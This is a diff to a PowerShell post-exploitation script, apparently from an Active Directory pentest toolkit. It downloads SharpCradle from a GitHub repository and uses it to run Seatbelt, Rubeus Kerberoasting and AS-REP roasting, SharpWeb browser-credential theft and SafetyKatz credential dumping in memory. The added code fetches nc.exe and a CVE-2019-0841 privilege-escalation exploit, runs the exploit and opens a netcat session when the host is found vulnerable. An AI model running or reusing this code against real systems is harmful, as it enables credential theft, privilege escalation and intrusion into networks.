@@ -85,36 +85,12 @@ function pathCheck
         $currentPath = (Get-Item -Path ".\" -Verbose).FullName                
         Write-Host -ForegroundColor Yellow 'Creating/Checking Log Folders in '$currentPath' directory:'
         
-        if (Test-Path $currentPath\LocalRecon\)
-        {
-            
-        }
-        else {mkdir $currentPath\LocalRecon\}
-        
-        if (Test-Path $currentPath\DomainRecon\)
-        {
-            
-        }
-        else {mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
-        
-        if (Test-Path $currentPath\LocalPrivEsc\)
-        {
-            
-        }
-        else {mkdir $currentPath\LocalPrivEsc\}
-        
-        if (Test-Path $currentPath\Exploitation\)
-        {
-            
-        }
-        else {mkdir $currentPath\Exploitation\}
-	
-	
-        if (Test-Path $currentPath\Vulnerabilities\)
-        {
-            
-        }
-        else {mkdir $currentPath\Vulnerabilities\}
+        if(!(Test-Path -Path $currentPath\LocalRecon\)){mkdir $currentPath\LocalRecon\}
+        if(!(Test-Path -Path $currentPath\DomainRecon\)){mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
+        if(!(Test-Path -Path $currentPath\LocalPrivEsc\)){mkdir $currentPath\LocalPrivEsc\}
+        if(!(Test-Path -Path $currentPath\Exploitation\)){mkdir $currentPath\Exploitation\}
+        if(!(Test-Path -Path $currentPath\Vulnerabilities\)){mkdir $currentPath\Vulnerabilities\}
+        if(!(Test-Path -Path $currentPath\LocalPrivEsc\)){mkdir $currentPath\LocalPrivEsc\}
 
 }
 
@@ -136,33 +112,15 @@ function sharpcradle{
     {
     	    if ([Environment]::Is64BitProcess)
     	    {
-       		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-       		Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all >> $currentPath\LocalRecon\SeatBeltOutput.txt
-		Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe asreproast /format:hashcat >> $currentPath\Exploitation\ASreproasting.txt
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe kerberoast /format:hashcat >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
-		Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
-		Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe all >> $currentPath\Exploitation\Browsercredentials.txt
-		Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt	
-		if (isadmin)
-		{
-			Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe audit >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
-			Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt
-		}
-		del .\cradle.exe
-    	    }
+       		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+       		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
+       		}
     	    else
     	    {
-       		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-       		Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'
+       		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+       		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle2.exe?raw=true -Outfile $currentPath\cradle.exe
+       		}
+        Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'
 		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all >> $currentPath\LocalRecon\SeatBeltOutput.txt
 		Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
 		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe asreproast /format:hashcat >> $currentPath\Exploitation\ASreproasting.txt
@@ -180,6 +138,15 @@ function sharpcradle{
 			Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'
 			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt
 		}
+        If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-0841 : VULNERABLE")
+        {
+            if(!(Test-Path -Path C:\temp\)){mkdir C:\temp}
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe
+            .\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/privesc.exe license.rtf
+            cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}
+
+        }
 		del .\cradle.exe
     	    }
 	    
